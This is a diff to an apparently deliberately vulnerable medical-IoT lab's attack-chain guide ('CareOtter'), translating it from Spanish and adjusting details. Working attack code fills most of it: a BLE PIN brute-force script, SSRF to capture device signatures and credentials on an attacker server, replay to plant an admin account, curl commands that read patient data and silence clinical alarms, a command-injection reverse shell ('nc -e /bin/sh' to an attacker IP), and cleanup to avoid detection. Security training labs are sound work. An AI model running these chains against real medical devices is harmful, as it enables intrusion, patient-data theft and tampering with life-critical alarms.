@@ -15,7 +15,6 @@
 - [Chain D — Stack Disclosure via Format String](#chain-d--stack-disclosure-via-format-string)
 - [Chain E — Full Device Compromise from BLE Proximity](#chain-e--full-device-compromise-from-ble-proximity)
 - [Chain F — Cloud API Impersonation via Signature Interception](#chain-f--cloud-api-impersonation-via-signature-interception)
-- [Alternative Path — Fallback `/initialize_iot`](#alternative-path--fallback-initialize_iot)
 - [Vulnerability Checklist](#vulnerability-checklist)
 - [Quick Reference — One-Liners](#quick-reference--one-liners)
 
@@ -45,9 +44,18 @@ Before any attack chain begins, the system is in the following state:
 # 1. Discover open IGP port
 nmap -sV -p 9999 192.168.2.1
 
-# 2. Extract hardcoded token from the binary
+# 2. Extract hardcoded token — pick ANY of these independent sources:
+#    a) Firmware (this snippet) — needs SD-card / shell access
 strings /path/to/careservice | grep -i otter
 # → OtterMobile2026
+#
+#    b) APK reverse engineering — needs only the patient/admin app
+#       (decode the XOR-obfuscated ENCODED_TOKEN in IgpClient.java with key 0x5A).
+#       Full step-by-step in CareOtter_Test_Suite.md → IGP-01 → Path B.
+#
+#    c) Passive network capture — sniff a single legitimate admin login on :9999
+#       and read the 15-byte payload after the 8-byte "CARE" header.
+#       Full step-by-step in CareOtter_Test_Suite.md → IGP-01 → Path C.
 
 # 3. Authenticate via IGP 0x02
 python3 << 'EOF'
@@ -129,8 +137,10 @@ EOF
 
 ## Chain C — WiFi Credential Theft
 
-> **Vector:** IGP v4 or HTTP · **Physical access:** No · **Prerequisites:** Network reachability
+> **Vector:** IGP v4 or HTTP · **Physical access:** No · **Prerequisites:** Network reachability + admin token
 > **Vulns:** Hardcoded token ([`I1`](IoT/CareOtter_IoT.md#i1)), PSK plaintext in API response ([`I6`](IoT/CareOtter_IoT.md#i6))
+
+> **Token acquisition**: this chain reuses `OtterMobile2026`. Obtain it via firmware `strings`, APK reverse (XOR `0x5A` on `ENCODED_TOKEN`), or passive sniff — all three paths are detailed in [`CareOtter_Test_Suite.md` → IGP-01](CareOtter_Test_Suite.md#learning-the-igp-protocol-without-igp_helperpy).
 
 ### Steps
 
@@ -198,10 +208,10 @@ AUTH    = "0000ff12-0000-1000-8000-00805f9b34fb"
 
 async def main():
     async with BleakClient(ADDRESS) as client:
-        # 1. Brute-force PIN 1234 (P3)
+        # 1. Brute-force PIN 6767 (P3)
         # AuthChrc.ReadValue solo devuelve {"attempts_remaining": N, "locked": bool}.
         # Tras un PIN OK, el servidor resetea attempts_remaining a 3 (ble_server.py).
-        # Detectamos el éxito leyendo el contador antes y después del write.
+        # Detect success by reading the counter before and after the write.
         for pin in range(10000):
             pin_str = f"{pin:04d}"
             prev = json.loads(await client.read_gatt_char(AUTH))
@@ -249,25 +259,25 @@ asyncio.run(main())
 > **Vector:** BLE GATT + HTTP · **Physical access:** BLE range + network · **Prerequisites:** Bluetooth range to Pi, network reachability to real Cloud API
 > **Vulns:** Hidden service ([`P1`](IoT/CareOtter_IoT.md#p1)), No pairing ([`P2`](IoT/CareOtter_IoT.md#p2)), Hardcoded PIN ([`P3`](IoT/CareOtter_IoT.md#p3)), Shell injection ([`P4`](IoT/CareOtter_IoT.md#p4)), SSRF + hardcoded signature ([`P6`](IoT/CareOtter_IoT.md#p6))
 
-### FASE 1: Reconocimiento (30 segundos)
+### PHASE 1: Reconnaissance (30 seconds)
 
 ```bash
-# Escaneo de puertos en la subnet
+# Port scan of the subnet
 nmap -sV -p 5002,8081,9999 192.168.2.0/24
 
-# Prueba login directo con credenciales por defecto
-# → Debe FALLAR si la BD está limpia (clean-slate)
+# Direct login test with default credentials
+# → Should FAIL if the DB is clean (clean-slate)
 curl -s -X POST http://192.168.2.2:5002/api/auth/login \
   -H "Content-Type: application/json" \
   -d '{"username":"admin","password":"CareOtter2026!"}'
 # → {"error":"Invalid username or password","code":"AUTH_FAIL"}
 
-# Lectura de la pista de provisioning
+# Read the provisioning hint
 curl -s http://192.168.2.2:5002/hint
 # → plaintext hint about CareOtter Medical Service configuration software
 ```
 
-### FASE 2: Descubrimiento BLE
+### PHASE 2: BLE Discovery
 
 ```python
 import asyncio
@@ -284,9 +294,9 @@ async def scan():
 asyncio.run(scan())
 ```
 
-> **Vuln ref:** [`I3`](IoT/CareOtter_IoT.md#i3) — `ManufacturerData` expone la IP:puerto del Cloud API. En estado no provisionado es `0.0.0.0:0`.
+> **Vuln ref:** [`I3`](IoT/CareOtter_IoT.md#i3) — `ManufacturerData` exposes the Cloud API IP:port. In the unprovisioned state it is `0.0.0.0:0`.
 
-### FASE 3: Enumeración GATT y descubrimiento del canal oculto
+### PHASE 3: GATT Enumeration and Hidden Channel Discovery
 
 ```python
 import asyncio
@@ -305,16 +315,16 @@ async def main():
 asyncio.run(main())
 ```
 
-**Servicio oculto esperado:**
+**Expected hidden service:**
 ```
 Service: 0000ff10-0000-1000-8000-00805f9b34fb  # NOT advertised
   Char: 0000ff11-... — ['read', 'write', 'notify']  # Provisioning Config
   Char: 0000ff12-... — ['read', 'write']            # Provisioning Auth
 ```
 
-> **Vuln ref:** [`P1`](IoT/CareOtter_IoT.md#p1) — El servicio `0xFF10` no se anuncia en Advertising, pero es visible vía `discover_services()`.
+> **Vuln ref:** [`P1`](IoT/CareOtter_IoT.md#p1) — The `0xFF10` service is not advertised in Advertising, but is visible via `discover_services()`.
 
-### FASE 4: Bypass de autenticación BLE (PIN brute-force)
+### PHASE 4: BLE Authentication Bypass (PIN brute-force)
 
 ```python
 import asyncio
@@ -344,12 +354,12 @@ asyncio.run(main())
 
 **Salida esperada:**
 ```
-[+] PIN cracked: 1234
+[+] PIN cracked: 6767
 ```
 
-> **Vuln ref:** [`P3`](IoT/CareOtter_IoT.md#p3) — PIN hardcoded `1234` en todos los dispositivos. Sin rate limiting.
+> **Vuln ref:** [`P3`](IoT/CareOtter_IoT.md#p3) — PIN hardcoded `6767` en todos los dispositivos. Sin rate limiting.
 
-### FASE 5: Lectura del estado de fábrica
+### PHASE 5: Read Factory State
 
 ```python
 CONFIG_UUID = "0000ff11-0000-1000-8000-00805f9b34fb"
@@ -359,7 +369,7 @@ async def read_state(client):
     print(data.decode())
 ```
 
-**Respuesta esperada (estado real expuesto por `ProvisioningConfigChrc.ReadValue`, `ble_server.py`):**
+**Expected response (real state exposed by `ProvisioningConfigChrc.ReadValue`, `ble_server.py`):**
 ```json
 {
   "wifi_ssid": "ClinicWiFi",
@@ -370,11 +380,11 @@ async def read_state(client):
 }
 ```
 
-> **Nota:** La característica `0xFF11` **NO** expone las credenciales `patient_*` ni `admin_*` por `ReadValue`. Esas credenciales se filtran en la **FASE 6C** cuando el dispositivo envía el `POST /admin/device/register` al `cloud_url` controlado por el atacante (ver `_send_registration_to_cloud` en `ble_server.py`). La lectura aquí solo confirma WiFi PSK + cloud_url actuales (suficiente para preparar el redireccionamiento).
+> **Note:** The `0xFF11` characteristic does **NOT** expose the `patient_*` or `admin_*` credentials via `ReadValue`. Those credentials are leaked in **PHASE 6C** when the device sends `POST /admin/device/register` to the attacker-controlled `cloud_url` (see `_send_registration_to_cloud` in `ble_server.py`). Reading here only confirms the current WiFi PSK + cloud_url (enough to prepare the redirect).
 
-> **Vuln ref:** [`P2`](IoT/CareOtter_IoT.md#p2) — No requiere pairing BLE. Conexión + PIN crackeado = acceso al estado WiFi/cloud.
+> **Vuln ref:** [`P2`](IoT/CareOtter_IoT.md#p2) — No BLE pairing is required. Connection + cracked PIN = access to the WiFi/cloud state.
 
-### FASE 6: Interceptación de la firma (Signature Interception)
+### PHASE 6: Signature Interception
 
 #### 6A. Servidor falso del atacante
 
@@ -400,13 +410,13 @@ if __name__ == '__main__':
     app.run(host='0.0.0.0', port=5002)
 ```
 
-#### 6B. Escritura de URL falsa vía BLE
+#### 6B. Writing a Fake URL via BLE
 
 ```python
 import json
 
 async def redirect_to_attacker(client):
-    # Configurar cuentas para que el Pi las envíe al atacante
+    # Configure accounts so the Pi sends them to the attacker
     await client.write_gatt_char(CONFIG_UUID, json.dumps({
         "cmd": "patient_set",
         "username": "alice_patient",
@@ -419,14 +429,14 @@ async def redirect_to_attacker(client):
         "password": "super_secret_admin_456"
     }).encode())
 
-    # cloud_set dispara _send_registration_to_cloud() automáticamente
+    # cloud_set triggers _send_registration_to_cloud() automatically
     await client.write_gatt_char(CONFIG_UUID, json.dumps({
         "cmd": "cloud_set",
         "url": "http://192.168.2.100:5002"
     }).encode())
 ```
 
-#### 6C. Captura en servidor del atacante
+#### 6C. Capture on the Attacker Server
 
 ```
 ============================================================
@@ -439,9 +449,9 @@ Device IP: 192.168.2.1
 ============================================================
 ```
 
-> **Vuln ref:** [`P6`](IoT/CareOtter_IoT.md#p6) — `cloud_set` acepta cualquier URL. El Pi auto-envía `DEVICE_SIGNATURE` + credenciales a esa URL.
+> **Vuln ref:** [`P6`](IoT/CareOtter_IoT.md#p6) — `cloud_set` accepts any URL. The Pi auto-sends `DEVICE_SIGNATURE` + credentials to that URL.
 
-### FASE 7: Replay al Cloud API real (Backend Takeover)
+### PHASE 7: Replay to the Real Cloud API (Backend Takeover)
 
 ```bash
 REAL_CLOUD="http://192.168.2.2:5002"
@@ -468,33 +478,33 @@ curl -s -X POST "$REAL_CLOUD/admin/device/register" \
 {"status": "registered", "device_mac": "B8:27:EB:12:34:56"}
 ```
 
-> **Vuln:** Firma `CareOtterFactorySig2026` global e idéntica. No está vinculada al MAC.
+> **Vuln:** The `CareOtterFactorySig2026` signature is global and identical. It is not bound to the MAC.
 
-### FASE 8: Acceso al panel de administración
+### PHASE 8: Access the Admin Panel
 
 ```bash
-# Login con cuenta admin inyectada
+# Login with the injected admin account
 TOKEN=$(curl -s -X POST "$REAL_CLOUD/api/auth/login" \
   -H "Content-Type: application/json" \
   -d '{"username":"dr_evil_ADMIN","password":"pwned_666!!!"}' \
   | python3 -c "import sys,json; print(json.load(sys.stdin)['token'])")
 
-# Listar pacientes
+# List patients
 curl -s "$REAL_CLOUD/api/admin/patients" \
   -H "Authorization: Bearer $TOKEN"
 
-# Leer vitales históricos
+# Read historical vitals
 curl -s "$REAL_CLOUD/api/admin/records" \
   -H "Authorization: Bearer $TOKEN"
 
-# Silenciar alarmas clínicas
+# Silence clinical alarms
 curl -s -X POST "$REAL_CLOUD/api/admin/thresholds" \
   -H "Authorization: Bearer $TOKEN" \
   -H "Content-Type: application/json" \
   -d '{"bpm_min":0,"bpm_max":255,"spo2_min":0,"spo2_max":100}'
 ```
 
-### FASE 9: Remote Code Execution (RCE) vía BLE
+### PHASE 9: Remote Code Execution (RCE) via BLE
 
 ```python
 async def rce_payload(client):
@@ -516,18 +526,18 @@ nc -e /bin/sh 192.168.2.100 4444
 ```
 
 ```bash
-# Atacante escucha
+# Attacker listens
 nc -lvnp 4444
-# → Conexión entrante como root desde el Pi
+# → Incoming connection as root from the Pi
 ```
 
-> **Vuln ref:** [`P4`](IoT/CareOtter_IoT.md#p4) — `wifi_set` interpola `ssid` en `os.system()` sin sanitizar.
+> **Vuln ref:** [`P4`](IoT/CareOtter_IoT.md#p4) — `wifi_set` interpolates `ssid` into `os.system()` without sanitization.
 
-### FASE 10: Persistencia y limpieza
+### PHASE 10: Persistence and Cleanup
 
 ```python
 async def cleanup(client):
-    # Restaurar cloud_url original para no levantar sospechas
+    # Restore the original cloud_url to avoid suspicion
     await client.write_gatt_char(CONFIG_UUID, json.dumps({
         "cmd": "cloud_set",
         "url": "http://hospital-cloud.local:5002"
@@ -536,59 +546,37 @@ async def cleanup(client):
 
 ### Timeline Chain F
 
-| Tiempo | Acción |
+| Time | Action |
 |--------|--------|
-| 0:00 | `nmap` o BLE scan |
-| 0:15 | GATT service discovery → `0xFF10` encontrado |
-| 0:30 | PIN brute-force `1234` |
-| 0:45 | Lee estado: `cloud_url: not_configured` |
-| 1:00 | Escribe `patient_set`, `admin_set`, `cloud_set` → auto-registro |
-| 1:15 | Captura firma + credenciales en servidor falso |
-| 1:30 | Replay a Cloud API real → admin account created |
-| 1:45 | Login como admin, exfiltración de datos |
-| 2:00 | `wifi_set` con shell injection → RCE |
-| 2:15 | Reverse shell como root |
+| 0:00 | `nmap` or BLE scan |
+| 0:15 | GATT service discovery → `0xFF10` found |
+| 0:30 | PIN brute-force `6767` |
+| 0:45 | Read state: `cloud_url: not_configured` |
+| 1:00 | Write `patient_set`, `admin_set`, `cloud_set` → auto-registration |
+| 1:15 | Capture signature + credentials on the fake server |
+| 1:30 | Replay to the real Cloud API → admin account created |
+| 1:45 | Log in as admin, exfiltrate data |
+| 2:00 | `wifi_set` with shell injection → RCE |
+| 2:15 | Reverse shell as root |
 
-**Tiempo total:** ~2 minutos con script automatizado.
-
----
-
-## Alternative Path — Fallback `/initialize_iot`
-
-Si el atacante **no descubre el BLE** pero tiene acceso de red:
-
-```bash
-curl -s -X POST http://192.168.2.2:5002/initialize_iot
-```
-
-**Respuesta (BD vacía):**
-```json
-{
-  "status": "initialized",
-  "note": "Fallback mode — default accounts created",
-  "admin": {"username": "admin", "password": "CareOtter2026!"},
-  "patient": {"username": "patient", "password": "patient123"}
-}
-```
-
-Ahora puede loguearse directamente con `admin`/`CareOtter2026!`. Este es el **modo fácil** del lab. Chain F es el **modo difícil/realista**.
+**Total time:** ~2 minutes with an automated script.
 
 ---
 
 ## Vulnerability Checklist
 
-| Paso | Vuln | CWE | Severidad | Documentación |
+| Step | Vuln | CWE | Severity | Documentation |
 |------|------|-----|-----------|---------------|
-| Descubrir `0xFF10` | P1 — Hidden Service | CWE-200 | Info | [`IoT doc`](IoT/CareOtter_IoT.md#p1) |
-| Sin pairing | P2 — No BLE Pairing | CWE-287 | Media | [`IoT doc`](IoT/CareOtter_IoT.md#p2) |
-| PIN `1234` | P3 — Hardcoded PIN | CWE-798 | Alta | [`IoT doc`](IoT/CareOtter_IoT.md#p3) |
-| Shell injection | P4 — Command Injection | CWE-78 | Crítica | [`IoT doc`](IoT/CareOtter_IoT.md#p4) |
-| PSK plaintext | P5 — Plaintext Storage | CWE-312 | Media | [`IoT doc`](IoT/CareOtter_IoT.md#p5) |
-| SSRF + firma | P6 — SSRF + Hardcoded Secret | CWE-918, CWE-798 | Crítica | [`IoT doc`](IoT/CareOtter_IoT.md#p6) |
-| Factory reset | P7 — Missing Auth | CWE-306 | Alta | [`IoT doc`](IoT/CareOtter_IoT.md#p7) |
-| Canal abierto | P8 — Missing Temporal Lockout | CWE-613 | Media | [`IoT doc`](IoT/CareOtter_IoT.md#p8) |
-| Hardcoded token | I1 — Hardcoded IGP Token | CWE-798 | Alta | [`IoT doc`](IoT/CareOtter_IoT.md#i1) |
-| Global auth state | I7 — Insecure Data Transfer | CWE-362 / CWE-613 | Alta | [`IoT doc`](IoT/CareOtter_IoT.md#i7) |
+| Discover `0xFF10` | P1 — Hidden Service | CWE-200 | Info | [`IoT doc`](IoT/CareOtter_IoT.md#p1) |
+| No pairing | P2 — No BLE Pairing | CWE-287 | Medium | [`IoT doc`](IoT/CareOtter_IoT.md#p2) |
+| PIN `6767` | P3 — Hardcoded PIN | CWE-798 | High | [`IoT doc`](IoT/CareOtter_IoT.md#p3) |
+| Shell injection | P4 — Command Injection | CWE-78 | Critical | [`IoT doc`](IoT/CareOtter_IoT.md#p4) |
+| PSK plaintext | P5 — Plaintext Storage | CWE-312 | Medium | [`IoT doc`](IoT/CareOtter_IoT.md#p5) |
+| SSRF + signature | P6 — SSRF + Hardcoded Secret | CWE-918, CWE-798 | Critical | [`IoT doc`](IoT/CareOtter_IoT.md#p6) |
+| Factory reset | P7 — Destructive op gated only by hardcoded factory PIN (no 2nd factor, no physical confirmation) | CWE-798 + CWE-307 + CWE-306 | High | [`IoT doc`](IoT/CareOtter_IoT.md#p7) |
+| Open channel | P8 — Missing Temporal Lockout | CWE-613 | Medium | [`IoT doc`](IoT/CareOtter_IoT.md#p8) |
+| Hardcoded token | I1 — Hardcoded IGP Token | CWE-798 | High | [`IoT doc`](IoT/CareOtter_IoT.md#i1) |
+| Global auth state | I7 — Insecure Data Transfer | CWE-362 / CWE-613 | High | [`IoT doc`](IoT/CareOtter_IoT.md#i7) |
 
 ---
 
@@ -612,9 +600,21 @@ print(igp(ip, 0x03))                        # GET_NETWORK → PSK
 print(igp(ip, 0x0C, b"x'; touch /tmp/pwned #"))  # CMD INJECTION
 EOF
 
-# Unauthenticated threshold overwrite (HTTP)
+# Sensor HTTP — unauthenticated probe leaks the required header name (vuln #15)
+curl -s -i http://192.168.2.1:8081/config | tail -1
+# → {"error": "unauthorized", "hint": "X-API-Key header required"}
+
+# Sensor HTTP — extract hardcoded API token from the firmware config
+grep api_key /opt/medical-sensor/config.json
+# → "api_key": "careotter-2024-lab"
+
+# Sensor HTTP — authenticated vitals read
+curl -s -H "X-API-Key: careotter-2024-lab" http://192.168.2.1:8081/vitals
+
+# Sensor HTTP — authenticated threshold overwrite
 curl -X POST http://192.168.2.1:8081/thresholds \
      -H "Content-Type: application/json" \
+     -H "X-API-Key: careotter-2024-lab" \
      -d '{"bpm_min":0,"bpm_max":255,"spo2_min":0}'
 
 # BLE ManufacturerData scan
@@ -629,10 +629,7 @@ async def scan():
 asyncio.run(scan())
 "
 
-# Cloud API — fallback initialization
-curl -X POST http://192.168.2.2:5002/initialize_iot
-
-# Cloud API — login with default credentials (after fallback)
+# Cloud API — login with default credentials (after device provisioning)
 curl -X POST http://192.168.2.2:5002/api/auth/login \
   -H "Content-Type: application/json" \
   -d '{"username":"admin","password":"CareOtter2026!"}'
@@ -651,52 +648,54 @@ curl -X POST http://192.168.2.2:5002/admin/device/register \
 
 ## Reproducibility Tracker
 
-> Usa esta tabla para registrar el resultado real de cada prueba en el laboratorio. **No repite los comandos** — están en las secciones anteriores. Solo anota si funcionó según lo documentado y qué observaste.
+> Use this table to record the real result of each test in the lab. **Do not repeat the commands** — they are in the previous sections. Only note whether it worked as documented and what you observed.
 
 ```markdown
-### Fecha de sesión: ___________
+### Session date: ___________
 
-| ID | Vuln | Estado | Output esperado (según docs) | Output real observado | ¿Necesita pulir docs/código? |
+| ID | Vuln | Status | Expected output (per docs) | Actual observed output | Does the docs/code need polishing? |
 |----|------|--------|------------------------------|----------------------|------------------------------|
 | IGP-01 | Hardcoded credential | ⬜ | AUTH_SUCCESS con OtterMobile2026 | | |
 | IGP-01b | Token incorrecto | ⬜ | AUTH_FAIL | | |
-| IGP-02 | WiFi PSK disclosure | ⬜ | option key en plaintext | | |
-| IGP-03 | Integer underflow → BOF | ⬜ | Crash o comportamiento anómalo | | |
-| IGP-04 | Format string | ⬜ | Stack leak en respuesta | | |
-| IGP-05 | Shell injection | ⬜ | Archivo creado en RPi | | |
-| IGP-06 | Global auth state | ⬜ | Datos sin autenticar en nueva TCP | | |
-| IGP-07 | Format string (therapy) | ⬜ | Stack leak en careotter_events.log | | |
-| IGP-08 | Command injection (alert) | ⬜ | Archivo creado en RPi | | |
+| IGP-02 | WiFi PSK disclosure | ⬜ | option key in plaintext | | |
+| IGP-03 | Integer underflow → BOF | ⬜ | Crash or anomalous behavior | | |
+| IGP-04 | Format string | ⬜ | Stack leak in response | | |
+| IGP-05 | Shell injection | ⬜ | File created on the RPi | | |
+| IGP-06 | Global auth state | ⬜ | Unauthenticated data on a new TCP connection | | |
+| IGP-07 | Format string (therapy) | ⬜ | Stack leak in careotter_events.log | | |
+| IGP-08 | Command injection (alert) | ⬜ | File created on the RPi | | |
 | API-01 | Weak JWT secret | ⬜ | Token forjado aceptado | | |
-| API-02 | WiFi PSK via REST | ⬜ | Campo .raw con PSK | | |
-| API-03 | Format string proxy | ⬜ | Stack leak del careservice | | |
-| API-04 | Flask debug / RCE | ⬜ | Werkzeug debugger expuesto | | |
-| API-05 | Weak password storage | ⬜ | Hash SHA-256 sin salt en SQLite | | |
-| API-06 | Partial role checks | ⬜ | Paciente accede a admin endpoint | | |
-| API-07 | Unauthenticated /hint | ⬜ | Pista recibida sin auth | | |
-| API-08 | Fallback /initialize_iot | ⬜ | Usuarios por defecto creados | | |
-| API-09 | Signature registration | ⬜ | Admin/patient creados vía firma | | |
+| API-02 | WiFi PSK via REST | ⬜ | .raw field with PSK | | |
+| API-03 | Format string proxy | ⬜ | Stack leak from careservice | | |
+| API-04 | Flask debug / RCE | ⬜ | Werkzeug debugger exposed | | |
+| API-05 | Weak password storage | ⬜ | Unsalted SHA-256 hash in SQLite | | |
+| API-06 | Partial role checks | ⬜ | Patient accesses admin endpoint | | |
+| API-07 | Unauthenticated /hint | ⬜ | Hint received without auth | | |
+| API-09 | Signature registration | ⬜ | Admin/patient created via signature | | |
 | BLE-01 | Missing BLE pairing | ⬜ | App conecta sin verificar MAC | | |
 | BLE-02 | Unencrypted BLE channel | ⬜ | BPM/SpO₂ en plaintext (Wireshark) | | |
-| BLE-03 | Plaintext external storage | ⬜ | Vitales en /sdcard/*.log | | |
-| BLE-04 | Hidden diagnostic panel | ⬜ | Panel DIAG accesible | | |
-| BLE-05 | Unvalidated GATT writes | ⬜ | Dispositivo acepta sin validar | | |
-| BLE-06 | CSCP key leak | ⬜ | careotter-key-16 expuesta | | |
-| BLE-07 | Threshold forging (M3) | ⬜ | Umbrales letales aplicados | | |
+| BLE-03 | Plaintext external storage | ⬜ | Vitals in /sdcard/*.log | | |
+| BLE-04 | Hidden diagnostic panel | ⬜ | DIAG panel accessible | | |
+| BLE-05 | Unvalidated GATT writes | ⬜ | Device accepts without validation | | |
+| BLE-06 | CSCP key leak | ⬜ | careotter-key-16 exposed | | |
+| BLE-07 | Threshold forging (M3) | ⬜ | Lethal thresholds applied | | |
 | BLE-08 | Hidden provisioning service | ⬜ | UUID 0xFF10 visible | | |
-| BLE-09 | Factory PIN brute force | ⬜ | PIN 1234 aceptado | | |
-| BLE-10 | WiFi PSK extraction | ⬜ | wifi_psk en plaintext | | |
-| BLE-11 | Shell injection (provisioning) | ⬜ | Archivo creado en RPi | | |
-| BLE-12 | SSRF via cloud_set | ⬜ | Pi envía registro a servidor atacante | | |
-| BLE-13 | Unauthenticated factory reset | ⬜ | Reset sin confirmación | | |
-| BLE-14 | Channel never expires | ⬜ | Canal activo tras 30 min | | |
+| BLE-09 | Factory PIN brute force | ⬜ | PIN 6767 accepted | | |
+| BLE-10 | WiFi PSK extraction | ⬜ | wifi_psk in plaintext | | |
+| BLE-11 | Shell injection (provisioning) | ⬜ | File created on the RPi | | |
+| BLE-12 | SSRF via cloud_set | ⬜ | Pi sends registration to attacker server | | |
+| BLE-13 | Factory reset behind hardcoded PIN | ⬜ | Reset accepted only after PIN `6767` write to `0xFF12`; pre-PIN attempt dropped with `PIN not verified` | | |
+| BLE-14 | Channel never expires | ⬜ | Channel still active after 30 min | | |
+| SENSOR-01 | Hardcoded sensor token | ⬜ | `api_key: careotter-2024-lab` en `config.json` | | |
+| SENSOR-02 | Timing side-channel auth | ⬜ | Measurable time difference `==` vs prefix | | |
+| SENSOR-03 | 401 hint leak | ⬜ | `hint: "X-API-Key header required"` in 401 from `/config`, `/vitals`, … | | |
 ```
 
-**Leyenda:**
-- ⬜ = No probado aún
-- ✅ = Funciona exactamente como documentado
-- ❌ = No funciona / output diferente al documentado
-- ⚠️ = Funciona parcialmente o requiere condiciones adicionales
+**Legend:**
+- ⬜ = Not tested yet
+- ✅ = Works exactly as documented
+- ❌ = Does not work / output differs from the documentation
+- ⚠️ = Partially works or requires additional conditions
 
 ---
 
